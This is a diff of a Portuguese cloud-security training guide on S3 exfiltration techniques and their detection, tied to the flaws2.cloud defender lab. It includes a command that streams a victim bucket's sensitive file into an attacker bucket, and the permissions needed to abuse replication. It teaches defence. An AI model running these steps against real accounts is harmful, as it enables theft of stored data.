@@ -1,7 +1,7 @@
-# Guia S06 — Segurança Ofensiva: Exfiltração via S3 + flaws2.cloud (modo defender)
+# Guia 6 — Segurança Ofensiva: Exfiltração via S3 + flaws2.cloud (modo defender)
 
-**Depende de:** S03 (mindset ofensivo + correlação CloudTrail)  
-**Próxima sessão:** S07 — CloudTrail Lake queries
+**Depende de:** Guia 3 (mindset ofensivo + correlação CloudTrail)  
+**Próxima sessão:** Guia 7 — CloudTrail Lake queries
 
 ---
 
@@ -32,7 +32,7 @@ Ao final, você deve conseguir — sem consultar documentação:
 
 ### 1.1 O que o CloudTrail captura por padrão em S3
 
-[FATO] O CloudTrail está ativo em todas as contas AWS desde a criação da conta. O **Event History** oferece 90 dias de histórico de management events de forma gratuita e imutável.
+ O CloudTrail está ativo em todas as contas AWS desde a criação da conta. O **Event History** oferece 90 dias de histórico de management events de forma gratuita e imutável.
 
 A separação crítica para S3:
 
@@ -41,15 +41,15 @@ A separação crítica para S3:
 | **Management events** | Operações de bucket (PutBucketPolicy, PutBucketReplication, PutBucketVersioning, CreateBucket, DeleteBucket, PutBucketAcl, PutBucketPublicAccessBlock) | **Sim** (first trail delivery free) | Sem custo adicional |
 | **Data events** | Operações em objetos (GetObject, PutObject, DeleteObject, CopyObject, SelectObjectContent) | **Não** — devem ser habilitados explicitamente | ~$0,10 por 100k eventos |
 
-[FATO] Confirmado nas docs da AWS: *"CloudTrail captures all API calls for Amazon S3 as events. The calls captured include calls from the Amazon S3 console and code calls to the Amazon S3 API operations."* — mas essa afirmação abrange o escopo completo de capturabilidade, não o que está ativo por padrão.
+ Confirmado nas docs da AWS: *"CloudTrail captures all API calls for Amazon S3 as events. The calls captured include calls from the Amazon S3 console and code calls to the Amazon S3 API operations."* — mas essa afirmação abrange o escopo completo de capturabilidade, não o que está ativo por padrão.
 
-[FATO] Para que GetObject, PutObject e outras operações de objeto sejam capturadas, é necessário configurar explicitamente data events no trail ou no CloudTrail Lake event data store. Sem isso, um atacante pode exfiltrar gigabytes de dados via `GetObject` e **nenhum log de CloudTrail registrará o acesso**.
+ Para que GetObject, PutObject e outras operações de objeto sejam capturadas, é necessário configurar explicitamente data events no trail ou no CloudTrail Lake event data store. Sem isso, um atacante pode exfiltrar gigabytes de dados via `GetObject` e **nenhum log de CloudTrail registrará o acesso**.
 
 ### 1.2 Por que data events não são habilitados por padrão
 
-[CONSENSO] A razão é volume e custo: um bucket S3 de produção pode receber milhões de requisições por hora. Habilitar data events sem filtragem adequada gera custo elevado e volume de logs que pode sobrecarregar pipelines de análise. Por isso, AWS optou por não habilitá-los por padrão e deixar o operador decidir granularidade (por bucket, por prefixo, por tipo de evento).
+ A razão é volume e custo: um bucket S3 de produção pode receber milhões de requisições por hora. Habilitar data events sem filtragem adequada gera custo elevado e volume de logs que pode sobrecarregar pipelines de análise. Por isso, AWS optou por não habilitá-los por padrão e deixar o operador decidir granularidade (por bucket, por prefixo, por tipo de evento).
 
-[CONSENSO] Organizações maduras habilitam data events seletivamente — nos buckets que contêm dados sensíveis ou que são acessíveis cross-account — em vez de habilitar para todos os buckets da conta.
+ Organizações maduras habilitam data events seletivamente — nos buckets que contêm dados sensíveis ou que são acessíveis cross-account — em vez de habilitar para todos os buckets da conta.
 
 ### 1.3 Habilitando data events via CLI
 
@@ -79,13 +79,13 @@ Para monitorar todos os buckets:
 
 ### 2.1 O mecanismo de ataque
 
-[FATO] Uma bucket policy é um tipo de **resource-based policy** — ela define quem pode fazer o quê no bucket, independentemente das políticas de identidade (IAM) do principal. Conforme documentado em Hacking The Cloud (Nick Frichetten, 2024):
+ Uma bucket policy é um tipo de **resource-based policy** — ela define quem pode fazer o quê no bucket, independentemente das políticas de identidade (IAM) do principal. Conforme documentado em Hacking The Cloud (Nick Frichetten, 2024):
 
 > *"Resource-based policies make it easy to share AWS resources across AWS accounts. They also, as a result, make it easy to unintentionally share resources."*
 
 **Vetor de ataque — `"Principal": "*"`:**
 
-[FATO] Quando o campo `Principal` de uma bucket policy é definido como `"*"`, o recurso se torna público — qualquer entidade da internet pode executar as ações permitidas pela policy.
+ Quando o campo `Principal` de uma bucket policy é definido como `"*"`, o recurso se torna público — qualquer entidade da internet pode executar as ações permitidas pela policy.
 
 Exemplo de misconfiguration real documentada (Twilio, 2020, via hackingthe.cloud):
 
@@ -102,7 +102,7 @@ Neste caso, qualquer atacante podia sobrescrever o JavaScript SDK hospedado no b
 
 **Vetor de ataque — cross-account deliberado:**
 
-[FATO] Uma bucket policy pode deliberadamente (ou por engano) conceder acesso a principals de outra conta. A regra de avaliação é assimétrica:
+ Uma bucket policy pode deliberadamente (ou por engano) conceder acesso a principals de outra conta. A regra de avaliação é assimétrica:
 
 | Contexto | Suficiente para acesso? |
 |----------|------------------------|
@@ -113,7 +113,7 @@ Isso significa: um atacante que controla o Account B e recebe `Allow` via bucket
 
 ### 2.2 `NotPrincipal`, `NotAction`, `NotResource` + Allow
 
-[FATO] Três elementos de negação combinados com `Allow` criam misconfigurations graves:
+ Três elementos de negação combinados com `Allow` criam misconfigurations graves:
 
 ```
 NotPrincipal + Allow → TODOS exceto o principal listado têm acesso
@@ -129,7 +129,7 @@ NotResource + Allow  → TODOS os recursos exceto o listado são acessíveis
 | Atacante lê objetos do bucket (GetObject) | `GetObject` | **Não** (data event) |
 | Atacante lista objetos do bucket | `ListBucket` (não é data event) | **Sim** (management event) |
 
-[CONSENSO] A misconfiguration em si (`PutBucketPolicy`) é detectável via management events. O acesso posterior aos dados só é visível se data events estiverem habilitados. GuardDuty tem um finding específico (`S3/AnomalousBehavior`) que pode detectar acessos anômalos mesmo sem data events explícitos, usando baselines de comportamento — mas essa cobertura não é garantida para todos os casos.
+ A misconfiguration em si (`PutBucketPolicy`) é detectável via management events. O acesso posterior aos dados só é visível se data events estiverem habilitados. GuardDuty tem um finding específico (`S3/AnomalousBehavior`) que pode detectar acessos anômalos mesmo sem data events explícitos, usando baselines de comportamento — mas essa cobertura não é garantida para todos os casos.
 
 ---
 
@@ -137,7 +137,7 @@ NotResource + Allow  → TODOS os recursos exceto o listado são acessíveis
 
 ### 3.1 O que é e por que é eficaz para exfiltração
 
-[FATO] S3 Replication é uma funcionalidade nativa de S3 que copia objetos de um bucket (source) para outro (destination), que pode estar em conta diferente. Conforme documentado em Hacking The Cloud (Ben Leembruggen, 2024):
+ S3 Replication é uma funcionalidade nativa de S3 que copia objetos de um bucket (source) para outro (destination), que pode estar em conta diferente. Conforme documentado em Hacking The Cloud (Ben Leembruggen, 2024):
 
 > *"Where this feature could be abused is where a malicious actor could input a replication policy to copy objects to an attacker controlled bucket. Objects will continue to be replicated for as long as the policy is in place, applying to all future objects placed into the bucket."*
 
@@ -145,7 +145,7 @@ A exfiltração é **contínua e automática** — diferente de técnicas que ex
 
 ### 3.2 Pré-requisitos e permissões mínimas
 
-[FATO] Para configurar cross-account replication, o atacante precisa, na conta vítima:
+ Para configurar cross-account replication, o atacante precisa, na conta vítima:
 
 ```
 iam:CreateRole + iam:CreatePolicy + iam:AttachRolePolicy  (criar role de replication)
@@ -156,17 +156,17 @@ iam:PassRole                                               (passar a role para o
 s3:CreateJob + s3:UpdateJobStatus                          (opcional: replicar objetos existentes via Batch)
 ```
 
-[FATO] Na conta do atacante (destination):
+ Na conta do atacante (destination):
 - Bucket com versioning habilitado
 - Bucket policy explicitamente permitindo `s3:ReplicateObject` e `s3:ReplicateDelete` ao role de replication da conta vítima
 
 ### 3.3 Replicação de objetos existentes
 
-[FATO] Por padrão, a replication policy cobre apenas objetos FUTUROS. Para replicar objetos já existentes, o atacante usa **S3 Batch Replication** (operação de lote criada via `s3:CreateJob`). Esse evento é crítico para detecção: indica que o atacante quis exportar o conteúdo inteiro do bucket, não apenas monitorar novos uploads.
+ Por padrão, a replication policy cobre apenas objetos FUTUROS. Para replicar objetos já existentes, o atacante usa **S3 Batch Replication** (operação de lote criada via `s3:CreateJob`). Esse evento é crítico para detecção: indica que o atacante quis exportar o conteúdo inteiro do bucket, não apenas monitorar novos uploads.
 
 ### 3.4 Objetos criptografados com KMS
 
-[FATO] Se os objetos do bucket são criptografados com KMS:
+ Se os objetos do bucket são criptografados com KMS:
 - A role de replication precisa de `kms:Decrypt` na chave do source account
 - O atacante precisa criar uma chave KMS em sua conta para re-encriptar os objetos na replicação
 - Os eventos `kms:Decrypt`/`kms:Encrypt` aparecem no CloudTrail Management trail **da conta vítima**, com `principalId` prefixado com `s3-replication` e referenciando uma chave KMS de outra conta — o que pode disparar alertas de data perimeter
@@ -189,7 +189,7 @@ s3:CreateJob + s3:UpdateJobStatus                          (opcional: replicar o
 
 ### 4.1 O que é uma pre-signed URL
 
-[CONSENSO] Uma pre-signed URL é uma URL temporária que concede acesso a um objeto S3 privado sem exigir credenciais AWS do requisitante. É gerada pelo SDK com as credenciais do signatário e inclui um prazo de expiração (máximo 7 dias para STS temporary credentials, 7 dias para IAM user keys com AWS Signature Version 4).
+ Uma pre-signed URL é uma URL temporária que concede acesso a um objeto S3 privado sem exigir credenciais AWS do requisitante. É gerada pelo SDK com as credenciais do signatário e inclui um prazo de expiração (máximo 7 dias para STS temporary credentials, 7 dias para IAM user keys com AWS Signature Version 4).
 
 Geração via Python:
 
@@ -210,7 +210,7 @@ print(url)
 
 ### 4.2 Por que é difícil de detectar
 
-[CONSENSO] `generate_presigned_url` é uma **operação local do SDK** — ela assina a URL usando as credenciais disponíveis, mas **não faz nenhuma chamada à API da AWS**. Portanto:
+ `generate_presigned_url` é uma **operação local do SDK** — ela assina a URL usando as credenciais disponíveis, mas **não faz nenhuma chamada à API da AWS**. Portanto:
 
 - **Nenhum CloudTrail event é gerado pela geração da URL**
 - O acesso via URL (HTTP GET) aparece em S3 **server access logs** (se habilitados) — não em CloudTrail
@@ -230,7 +230,7 @@ print(url)
 
 ### 4.4 Técnica bônus: S3 Streaming Copy
 
-[FATO] Documentada em Hacking The Cloud (Houston Hopkins, 2023), esta técnica usa pipes da CLI para copiar dados da conta vítima diretamente para um bucket do atacante sem salvar localmente:
+ Documentada em Hacking The Cloud (Houston Hopkins, 2023), esta técnica usa pipes da CLI para copiar dados da conta vítima diretamente para um bucket do atacante sem salvar localmente:
 
 ```bash
 # Vítima não vê o PutObject — apenas o GetObject aparece em seu CloudTrail
@@ -238,7 +238,7 @@ aws s3 cp --profile vitima s3://bucket-vitima/dados-sensiveis.csv - \
   | aws s3 cp --profile atacante - s3://bucket-atacante/dados-exfiltrados.csv
 ```
 
-[FATO] Conforme documentado: *"The S3 GetObject call is recorded in the VICTIM cloudtrail dataevents (if enabled, which is unlikely). But, the S3 PutObject call is recorded in the ATTACKER's cloudtrail. The VICTIM cannot see the S3 PutObject side of the copy in AWS Cloudtrail."*
+ Conforme documentado: *"The S3 GetObject call is recorded in the VICTIM cloudtrail dataevents (if enabled, which is unlikely). But, the S3 PutObject call is recorded in the ATTACKER's cloudtrail. The VICTIM cannot see the S3 PutObject side of the copy in AWS Cloudtrail."*
 
 **Contra-medida:** VPC Endpoint policy com condição `aws:PrincipalOrgID` que impede chamadas a buckets fora da organização.
 
@@ -294,7 +294,7 @@ Objetivo: permitir que aplicações internas (roles da própria conta) acessem o
 }
 ```
 
-[CONSENSO] A condição `aws:PrincipalOrgID` verifica se o principal (usuário, role, serviço) pertence à organização AWS especificada. Isso bloqueia:
+ A condição `aws:PrincipalOrgID` verifica se o principal (usuário, role, serviço) pertence à organização AWS especificada. Isso bloqueia:
 - Accounts externas completamente
 - Contas pessoais de atacantes que obtiveram credenciais vazadas
 - Pre-signed URLs usadas por externos (a URL herda as permissões do signatário, mas a condição é avaliada no momento do acesso)
@@ -318,7 +318,7 @@ Objetivo: permitir que aplicações internas (roles da própria conta) acessem o
 }
 ```
 
-[CONSENSO] Para proteção mais robusta, usar **SCPs** (Service Control Policies) para bloquear `s3:PutBucketReplication` para recursos fora da organização em nível organizacional, em vez de confiar apenas na bucket policy individual.
+ Para proteção mais robusta, usar **SCPs** (Service Control Policies) para bloquear `s3:PutBucketReplication` para recursos fora da organização em nível organizacional, em vez de confiar apenas na bucket policy individual.
 
 ---
 
@@ -326,7 +326,7 @@ Objetivo: permitir que aplicações internas (roles da própria conta) acessem o
 
 ### 6.1 O que é flaws2.cloud
 
-[CONSENSO] flaws2.cloud foi criado por Scott Piper (summitroute), pesquisador de segurança AWS. O lab tem dois caminhos:
+ flaws2.cloud foi criado por Scott Piper (summitroute), pesquisador de segurança AWS. O lab tem dois caminhos:
 - **Attacker path**: você explora vulnerabilidades progressivas em recursos AWS para avançar nos "levels"
 - **Defender path**: dado um cenário de comprometimento, você analisa logs e evidências para reconstruir os passos do atacante
 
@@ -334,7 +334,7 @@ Objetivo: permitir que aplicações internas (roles da própria conta) acessem o
 
 ### 6.2 Mindset para o modo defender
 
-[CONSENSO] O valor do flaws2.cloud defender não está em "resolver" os challenges, mas em desenvolver o raciocínio de análise forense em AWS. Abordagem recomendada para cada challenge:
+ O valor do flaws2.cloud defender não está em "resolver" os challenges, mas em desenvolver o raciocínio de análise forense em AWS. Abordagem recomendada para cada challenge:
 
 **Antes de ver a resposta:**
 1. Identificar quais logs estão disponíveis (CloudTrail? S3 server access logs? VPC flow logs?)
